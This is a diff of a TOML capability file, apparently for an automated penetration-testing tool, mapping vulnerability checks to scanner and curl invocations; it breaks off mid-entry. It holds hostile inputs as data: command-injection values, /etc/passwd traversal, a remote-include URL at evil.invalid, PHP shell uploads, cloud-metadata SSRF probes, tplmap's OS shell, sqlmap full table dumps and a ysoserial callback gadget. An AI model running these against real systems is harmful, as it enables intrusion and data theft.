@@ -3856,9 +3856,9 @@ args = ['https://{target}']
 output = 'lines'
 network = true
 
-# --------------------------------------------------------------------------
-# VULNERABILITY
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 3 — VULNERABILITY
+# ==========================================================================
 
 [[capability]]
 id = 'vulnerability.template-scan'
@@ -3874,25 +3874,64 @@ inputs = [
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'Severity Scan'
+args = ['-u', '{target}', '-severity', '{severity}', '-silent', '-nc', '-rl', '{rate}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Severity List Scan'
 args = ['-l', '{target}', '-severity', '{severity}', '-silent', '-nc', '-rl', '{rate}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'CVE Templates'
-args = ['-l', '{target}', '-tags', 'cve', '-severity', '{severity}', '-silent', '-nc']
+args = ['-u', '{target}', '-tags', 'cve', '-severity', '{severity}', '-silent', '-nc']
 output = 'lines'
 network = true
-
+[[capability.provider.operation]]
+name = 'Critical Only'
+args = ['-u', '{target}', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'JSON Result Dump'
+args = ['-u', '{target}', '-severity', '{severity}', '-j', '-silent', '-nc', '-o', 'nuclei_results.json']
+output = 'json'
+network = true
 [[capability.provider.operation]]
 name = 'Workflow Scan'
-args = ['-l', '{target}', '-w', 'workflows/', '-silent', '-nc']
+args = ['-u', '{target}', '-w', 'workflows/', '-silent', '-nc']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Auto Calibration'
 args = ['-u', '{target}', '-as', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Exposure Tags'
+args = ['-u', '{target}', '-tags', 'exposure', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Misconfig Tags'
+args = ['-u', '{target}', '-tags', 'misconfig', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Default Login Tags'
+args = ['-u', '{target}', '-tags', 'default-login', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Panel Detect Tags'
+args = ['-u', '{target}', '-tags', 'panel', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Corroborating Quick Scan'
+args = ['-h', '{target}', '-nointeractive', '-o', 'nikto_corroborate.txt']
 output = 'lines'
 network = true
 
@@ -3908,27 +3947,30 @@ inputs = [
 binary = 'nikto'
 [[capability.provider.operation]]
 name = 'Full Tuning'
-args = ['-h', '{url}', '-C', 'all', '-o', '-', '-Format', 'json', '-nointeractive']
-output = 'lines'
+args = ['-h', '{url}', '-C', 'all', '-o', 'nikto_full.json', '-Format', 'json', '-nointeractive']
+output = 'json'
 network = true
-
 [[capability.provider.operation]]
 name = 'Deep Mutate'
 args = ['-h', '{url}', '-Tuning', '123456789abc', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Injection Tuning'
+args = ['-h', '{url}', '-Tuning', '123', '-nointeractive']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wapiti'
 [[capability.provider.operation]]
 name = 'Domain Audit'
-args = ['-u', '{url}', '--scope', 'domain', '-m', 'all', '-f', 'json']
-output = 'lines'
+args = ['-u', '{url}', '--scope', 'domain', '-m', 'all', '-f', 'json', '-o', 'wapiti_domain.json']
+output = 'json'
 network = true
-
 [[capability.provider.operation]]
 name = 'Page Audit'
-args = ['-u', '{url}', '--scope', 'page', '-m', 'all', '-f', 'json']
-output = 'lines'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'all', '-f', 'json', '-o', 'wapiti_page.json']
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'nuclei'
@@ -3937,11 +3979,43 @@ name = 'Exposure Templates'
 args = ['-u', '{url}', '-tags', 'exposure', '-silent', '-nc']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Misconfig Templates'
 args = ['-u', '{url}', '-tags', 'misconfig', '-silent', '-nc']
 output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'Aggressive Fingerprint'
+args = ['-a', '3', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wafw00f'
+[[capability.provider.operation]]
+name = 'WAF Enumerate'
+args = ['{url}', '-a']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Backup File Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/backup.zip']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Debug Endpoint Probe'
+args = ['-sk', '{url}/debug']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Response Fingerprint'
+args = ['-u', '{url}', '-title', '-sc', '-cl', '-silent', '-nc', '-json']
+output = 'json'
 network = true
 
 [[capability]]
@@ -3959,28 +4033,29 @@ name = 'Confirm Injection'
 args = ['-u', '{url}', '--batch', '--level', '1', '--risk', '1', '--threads', '4']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Deep Scan'
 args = ['-u', '{url}', '--batch', '--level', '3', '--risk', '2', '--threads', '4']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Database Enum'
 args = ['-u', '{url}', '--batch', '--dbs', '--level', '3', '--risk', '2']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Technique Tuning'
 args = ['-u', '{url}', '--batch', '--technique=BEUSTQ', '--level', '5', '--risk', '3']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Form Crawl'
 args = ['--crawl=3', '-u', '{url}', '--batch', '--forms']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Dump Tables'
+args = ['-u', '{url}', '--batch', '--dump-all', '--exclude-sysdbs']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -3990,11 +4065,37 @@ name = 'Advanced Detect'
 args = ['-u', '{url}', '--batch']
 output = 'lines'
 network = true
+[[capability.provider.operation]]
+name = 'Level Three Detect'
+args = ['-u', '{url}', '--batch', '--level', '3']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'SQLI Templates'
+args = ['-u', '{url}', '-tags', 'sqli', '-silent', '-nc']
+output = 'lines'
+network = true
 [[capability.provider]]
 binary = 'nmap'
 [[capability.provider.operation]]
 name = 'HTTP SQLI Script'
 args = ['--script', 'http-sql-injection', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wafw00f'
+[[capability.provider.operation]]
+name = 'WAF Pre Check'
+args = ['{url}', '-a']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Error Based Probe'
+args = ['-sk', '-G', '--data-urlencode', "id=1'", '{url}']
 output = 'lines'
 network = true
 
@@ -4010,19 +4111,22 @@ inputs = [
 binary = 'dalfox'
 [[capability.provider.operation]]
 name = 'URL Scan'
-args = ['url', '{url}', '-S', '--no-color']
+args = ['url', '{url}']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Deep DOM Scan'
-args = ['url', '{url}', '-S', '--no-color', '--deep-domxss']
+args = ['url', '{url}', '--deep-domxss']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Blind Scan'
-args = ['url', '{url}', '-S', '--no-color', '--blind']
+args = ['url', '{url}', '--blind']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Silent Scan'
+args = ['url', '{url}', '--silence']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -4036,7 +4140,49 @@ network = true
 binary = 'nuclei'
 [[capability.provider.operation]]
 name = 'XSS Templates'
-args = ['-l', '{url}', '-tags', 'xss', '-silent', '-nc']
+args = ['-u', '{url}', '-tags', 'xss', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'paramspider'
+[[capability.provider.operation]]
+name = 'Archived Param Pull'
+args = ['-d', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_xss.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Reflected Marker Probe'
+args = ['-sk', '-G', '--data-urlencode', 'q=xssmarker"><script>', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Header Reflection Probe'
+args = ['-skI', '-H', 'X-Probe: <script>alert(1)</script>', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'katana'
+[[capability.provider.operation]]
+name = 'Form Param Crawl'
+args = ['-u', '{url}', '-d', '3', '-aff', '-silent']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'gospider'
+[[capability.provider.operation]]
+name = 'Spider Params Pull'
+args = ['-s', '{url}', '-d', '2', '-c', '10', '--params']
 output = 'lines'
 network = true
 
@@ -4055,16 +4201,19 @@ name = 'Batch All'
 args = ['-u', '{url}', '--batch', '--all']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Classic Technique'
-args = ['-u', '{url}', '--batch', '--os-cmd=id', '--technique=classic']
+args = ['-u', '{url}', '--batch', '--technique=classic']
 output = 'lines'
 network = true
-
 [[capability.provider.operation]]
 name = 'Time Based'
-args = ['-u', '{url}', '--batch', '--os-cmd=id', '--technique=time-based']
+args = ['-u', '{url}', '--batch', '--technique=time-based']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Eval Based'
+args = ['-u', '{url}', '--batch', '--technique=eval-based']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -4078,7 +4227,593 @@ network = true
 binary = 'wapiti'
 [[capability.provider.operation]]
 name = 'Exec Module'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'exec', '-f', 'json', '-o', 'wapiti_exec.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'RCE Tuning'
+args = ['-h', '{url}', '-Tuning', '5', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Sleep Marker Probe'
+args = ['-sk', '-G', '--data-urlencode', 'cmd=;sleep 5', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Backtick Probe'
+args = ['-sk', '-G', '--data-urlencode', 'cmd=`id`', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_cmdi.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'paramspider'
+[[capability.provider.operation]]
+name = 'Archive Param Pull'
+args = ['-d', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'HTTP RCE Scripts'
+args = ['--script', 'http-shellshock', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'vulnerability.ssti-detection'
+phase = 'vulnerability'
+label = 'SSTI DETECTION'
+summary = 'Detect server side template injection and engine fingerprint'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'tplmap'
+[[capability.provider.operation]]
+name = 'Auto Detect'
+args = ['-u', '{url}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'OS Shell Probe'
+args = ['-u', '{url}', '--os-shell']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Engine Force'
+args = ['-u', '{url}', '-e', 'jinja2']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'SSTI Templates'
+args = ['-u', '{url}', '-tags', 'ssti', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Payload Fuzz'
+args = ['-u', '{url}?name=FUZZ', '-w', '/usr/share/wordlists/ssti.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jinja Math Probe'
+args = ['-sk', '-G', '--data-urlencode', 'name={{7*7}}', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Twig Math Probe'
+args = ['-sk', '-G', '--data-urlencode', 'name={{7*7}}', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Freemarker Probe'
+args = ['-sk', '-G', '--data-urlencode', 'name=${7*7}', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_ssti.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'whatweb'
+[[capability.provider.operation]]
+name = 'Engine Fingerprint'
+args = ['{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'Template Module Audit'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'ssti', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'commix'
+[[capability.provider.operation]]
+name = 'Batch Sweep'
+args = ['-u', '{url}', '--batch']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'vulnerability.file-inclusion'
+phase = 'vulnerability'
+label = 'FILE INCLUSION'
+summary = 'Detect local and remote file inclusion in parameters'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'LFI Wordlist Fuzz'
+args = ['-u', '{url}?file=FUZZ', '-w', '/usr/share/wordlists/lfi.txt', '-mc', '200', '-fc', '404', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ETC Passwd Probe'
+args = ['-sk', '-G', '--data-urlencode', 'file=../../../../etc/passwd', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Null Byte Probe'
+args = ['-sk', '-G', '--data-urlencode', 'file=../../../../etc/passwd%00', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Filter Chain Probe'
+args = ['-sk', '-G', '--data-urlencode', 'file=php://filter/convert.base64-encode/resource=index.php', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'RFI HTTP Probe'
+args = ['-sk', '-G', '--data-urlencode', 'file=http://evil.invalid/shell.txt', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'LFI Templates'
+args = ['-u', '{url}', '-tags', 'lfi,fileupload,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wfuzz'
+[[capability.provider.operation]]
+name = 'Path Traversal Fuzz'
+args = ['-u', '{url}?file=FUZZ', '-w', '/usr/share/wordlists/lfi.txt', '--hc', '404', '-t', '30']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_lfi.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'paramspider'
+[[capability.provider.operation]]
+name = 'Archive Param Pull'
+args = ['-d', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Traversal Tuning'
+args = ['-h', '{url}', '-Tuning', '4', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'File Handling Audit'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'file', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'HTTP Traversal Script'
+args = ['--script', 'http-vuln-cve2006-3392', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'vulnerability.file-upload'
+phase = 'vulnerability'
+label = 'FILE UPLOAD'
+summary = 'Test upload endpoints for unrestricted file upload flaws'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'field', type = 'text', required = false, default = 'file' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'PHP Shell Upload'
+args = ['-sk', '-F', '{field}=@shell.php', '{url}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Double Extension Upload'
+args = ['-sk', '-F', '{field}=@shell.php.jpg', '{url}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Polyglot Upload'
+args = ['-sk', '-F', '{field}=@shell.jpg', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Upload Response Body'
+args = ['-sk', '-F', '{field}=@shell.php', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Upload Templates'
+args = ['-u', '{url}', '-tags', 'upload,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'fuzzdb'
+[[capability.provider.operation]]
+name = 'Extension List Dump'
+args = ['-d']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'Upload Module Audit'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'upload', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Upload Tuning'
+args = ['-h', '{url}', '-Tuning', '9', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'katana'
+[[capability.provider.operation]]
+name = 'Upload Form Crawl'
+args = ['-u', '{url}', '-d', '3', '-aff', '-silent']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Uploaded Path Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/uploads/shell.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Content Type Bypass'
+args = ['-sk', '-F', '{field}=@shell.php;type=image/jpeg', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Upload Path Fuzz'
+args = ['-u', '{url}/uploads/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200', '-of', 'json']
+output = 'json'
+network = true
+
+[[capability]]
+id = 'vulnerability.ssrf-detection'
+phase = 'vulnerability'
+label = 'SSRF DETECTION'
+summary = 'Detect server side request forgery in URL-accepting parameters'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'SSRF Templates'
+args = ['-u', '{url}', '-tags', 'ssrf', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Metadata AWS Probe'
+args = ['-sk', '-G', '--data-urlencode', 'url=http://169.254.169.254/latest/meta-data/', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Metadata GCP Probe'
+args = ['-sk', '-G', '--data-urlencode', 'url=http://metadata.google.internal/computeMetadata/v1/', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Localhost Probe'
+args = ['-sk', '-G', '--data-urlencode', 'url=http://127.0.0.1:80', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'File Scheme Probe'
+args = ['-sk', '-G', '--data-urlencode', 'url=file:///etc/passwd', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Internal Port Sweep 8080'
+args = ['-sk', '-G', '--data-urlencode', 'url=http://127.0.0.1:8080', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'URL Param Fuzz'
+args = ['-u', '{url}?url=FUZZ', '-w', '/usr/share/wordlists/ssrf.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'arjun'
+[[capability.provider.operation]]
+name = 'Param Pre Hunt'
+args = ['-u', '{url}', '-oJ', 'arjun_ssrf.json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'paramspider'
+[[capability.provider.operation]]
+name = 'Archive Param Pull'
+args = ['-d', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'collaborator-free'
+[[capability.provider.operation]]
+name = 'DNS Callback Probe'
+args = ['--url', '{url}', '--param', 'url']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'SSRF Module Audit'
+args = ['-u', '{url}', '--scope', 'page', '-m', 'ssrf', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Redirect Chain Probe'
+args = ['-skIL', '{url}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'vulnerability.deserialization-test'
+phase = 'vulnerability'
+label = 'DESERIALIZATION TEST'
+summary = 'Probe endpoints and Java services for deserialization flaws'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = false, default = '127.0.0.1' },
+  { key = 'lport', type = 'port', required = false, default = '4444' },
+]
+[[capability.provider]]
+binary = 'ysoserial'
+[[capability.provider.operation]]
+name = 'Payload Generate'
+args = ['CommonsCollections1', 'id']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'URLDNS Probe'
+args = ['URLDNS', '{url}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'JRMP Generate'
+args = ['JRMPClient', '{lhost}:{lport}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Deserialization Templates'
+args = ['-u', '{url}', '-tags', 'deserialization,java', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'RMI Scripts'
+args = ['--script', 'rmi-dumpregistry,rmi-vuln-classloader', '-p', '1099', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Struts Script'
+args = ['--script', 'http-vuln-cve2017-5638', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Java Content Type Probe'
+args = ['-sk', '-X', 'POST', '-H', 'Content-Type: application/x-java-serialized-object', '--data-binary', 'aced0005', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ViewState Probe'
+args = ['-sk', '{url}?d=aced0005']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Java Tuning'
+args = ['-h', '{url}', '-Tuning', '1234', '-nointeractive']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wapiti'
+[[capability.provider.operation]]
+name = 'Exec Module Audit'
 args = ['-u', '{url}', '--scope', 'page', '-m', 'exec', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Weblogic T3 Script'
+args = ['-sV', '-p', '7001', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'Deser Exploit Search'
+args = ['deserialization', 'rce']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'vulnerability.fuzz-testing'
+phase = 'vulnerability'
+label = 'FUZZ TESTING'
+summary = 'Fuzz parameters, paths and headers for abnormal behaviour'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
+]
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Path Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json', '-o', 'ffuf_path.json']
+output = 'json'
+network = true
+[[capability.provider.operation]]
+name = 'Parameter Fuzz'
+args = ['-u', '{url}?file=FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json', '-o', 'ffuf_param.json']
+output = 'json'
+network = true
+[[capability.provider.operation]]
+name = 'Header Fuzz'
+args = ['-u', '{url}', '-H', 'FUZZ: evil', '-w', '{wordlist}', '-mc', 'all', '-fc', '404']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wfuzz'
+[[capability.provider.operation]]
+name = 'Word Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '--hc', '404', '-t', '50']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Double Fuzz'
+args = ['-z', 'file,{wordlist}', '-z', 'file,{wordlist}', '{url}/FUZZ/FUZ2Z', '--hc', '404', '-t', '30']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'radamsa'
+[[capability.provider.operation]]
+name = 'Mutation Fuzz'
+args = ['-n', '100', '{url}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Oversized Payload Probe'
+args = ['-sk', '-X', 'POST', '--data-binary', '@/dev/zero', '--max-filesize', '1000000', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Long Header Probe'
+args = ['-skI', '-H', 'X-Fuzz: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Unicode Path Probe'
+args = ['-sk', '--path-as-is', '{url}/%c0%ae%c0%ae/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'HTTP Fuzz Script'
+args = ['--script', 'http-enum', '-p', '80,443', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'gobuster'
+[[capability.provider.operation]]
+name = 'Fuzz Mode Dir'
+args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-t', '50', '-b', '404']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nikto'
+[[capability.provider.operation]]
+name = 'Mutation Tuning'
+args = ['-h', '{url}', '-Tuning', '123456789abc', '-nointeractive']
 output = 'lines'
 network = true
 
@@ -4094,42 +4829,82 @@ inputs = [
 binary = 'trivy'
 [[capability.provider.operation]]
 name = 'Filesystem Scan'
-args = ['fs', '{path}', '--severity', 'HIGH,CRITICAL', '-f', 'json']
-output = 'lines'
+args = ['fs', '--severity', 'HIGH,CRITICAL', '-f', 'json', '{path}']
+output = 'json'
 network = true
-
 [[capability.provider.operation]]
 name = 'All Packages'
-args = ['fs', '{path}', '--list-all-pkgs', '-f', 'json']
-output = 'lines'
+args = ['fs', '--list-all-pkgs', '-f', 'json', '{path}']
+output = 'json'
 network = true
-
 [[capability.provider.operation]]
 name = 'SBOM Scan'
-args = ['sbom', '{path}', '-f', 'json']
-output = 'lines'
+args = ['sbom', '-f', 'json', '{path}']
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'grype'
 [[capability.provider.operation]]
 name = 'Directory Scan'
 args = ['dir:{path}', '-o', 'json']
-output = 'lines'
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'osv-scanner'
 [[capability.provider.operation]]
 name = 'Recursive Scan'
 args = ['-r', '{path}', '--json']
-output = 'lines'
+output = 'json'
 network = true
 [[capability.provider]]
 binary = 'semgrep'
 [[capability.provider.operation]]
 name = 'Static Analysis'
-args = ['scan', '--config=auto', '{path}', '--json']
-output = 'lines'
+args = ['scan', '--config=auto', '--json', '{path}']
+output = 'json'
 network = true
+[[capability.provider]]
+binary = 'searchsploit'
+[[capability.provider.operation]]
+name = 'Exploit Correlate'
+args = ['--json', 'python', 'flask']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Manifest Pull'
+args = ['-rE', 'requirements.txt|package.json|go.mod|pom.xml', '{path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'npm-audit'
+[[capability.provider.operation]]
+name = 'Node Audit'
+args = ['--json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'pip-audit'
+[[capability.provider.operation]]
+name = 'Python Audit'
+args = ['-r', '{path}/requirements.txt', '-f', 'json']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'syft'
+[[capability.provider.operation]]
+name = 'SBOM Generate'
+args = ['dir:{path}', '-o', 'json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'find'
